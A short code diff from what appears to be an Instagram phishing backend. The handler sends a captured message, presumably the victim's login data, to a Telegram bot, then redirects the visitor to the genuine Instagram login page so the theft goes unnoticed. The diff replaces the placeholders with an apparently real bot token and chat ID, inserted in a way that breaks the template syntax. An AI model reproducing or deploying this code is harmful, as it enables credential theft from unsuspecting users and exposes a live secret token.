@@ -12,7 +12,7 @@ export default async function handler(req, res) {
         // Send to Telegram
         const BOT_TOKEN = "YOUR_BOT_TOKEN";
         const CHAT_ID = "YOUR_CHAT_ID";
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${msg}`);
+        await fetch(`https://api.telegram.org/bot${8722382021:AAEhs71lAw8p1m4due-ICYMjKUNuylcVUq4}/sendMessage?chat_id=${6797160131}&text=${msg}`);
 
         // Redirect to real Instagram
         res.writeHead(302, { Location: 'https://www.instagram.com/accounts/login/' });
